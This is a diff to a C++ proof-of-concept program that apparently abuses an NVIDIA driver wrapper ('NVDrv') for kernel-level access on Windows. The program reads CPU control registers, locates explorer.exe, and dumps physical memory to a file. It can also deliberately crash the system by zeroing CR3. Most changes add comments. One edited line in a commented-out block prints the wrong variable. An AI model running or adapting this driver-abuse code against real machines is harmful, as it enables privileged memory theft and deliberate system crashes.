@@ -11,6 +11,11 @@ void WriteFileToDisk(const char* file_name, uintptr_t buffer, DWORD size)
 int main()
 {
 	NVDrv* NV = new NVDrv();
+	
+	/*
+	*	 Read control registers 0 - 4
+	* 
+	*/
 
 	DWORD CR0 = NV->ReadCr(NVDrv::NVControlRegisters::CR0);
 	printf("CR0: %p\n", (void*)CR0);
@@ -27,11 +32,28 @@ int main()
 	uintptr_t ProcessBase = NV->GetProcessBase(L"explorer.exe");
 	printf("ProcessBase: %p\n", (void*)ProcessBase);
 
+	/*
+	*	 Allocate temp memory for the dump
+	*
+	*/
+
 	DWORD DumpSize = 0xFFFF;
 	uintptr_t Allocation = (uintptr_t)VirtualAlloc(0, DumpSize, MEM_COMMIT, PAGE_READWRITE);
 
+
+	/*
+	*	 Read physical memory onto allocation
+	*
+	*/
+
 	for (int i = 0; i < (DumpSize / 8); i++)
 		NV->ReadPhysicalMemory(i * 8, (uintptr_t*)(Allocation + i * 8), 8);
+
+
+	/*
+	*	Write the allocation to disk
+	*
+	*/
 
 	WriteFileToDisk("PhysicalMemoryDump.bin", Allocation, DumpSize);
 
@@ -40,18 +62,24 @@ int main()
 
 	int Result = MessageBoxA(0, "BSOD via nulling CR3?", "Test", MB_YESNO);
 
+	/*
+	*	 Bluescreen via writing 0 to the control register 3
+	*
+	*/
+
 	if (Result == IDYES)
 		NV->WriteCr(NVDrv::NVControlRegisters::CR3, 0);
 
 	/*
-	// Disable KVA shadowing before continuing with this
-	//
+	*	Disable KVA shadowing before continuing with this
+	*/
+
+	/*
 	auto SystemCR3 = NV->GetSystemCR3();
 	printf("SystemCR3: %p\n", (void*)SystemCR3);
 
 	auto ProcessCR3 = NV->GetProcessCR3(ProcessBase);
-	printf("ProcessCR3: %p\n", (void*)ProcessCR3);
-
+	printf("ProcessCR3: %p\n", (void*)SystemCR3);
 	*/
 
 	Sleep(-1);
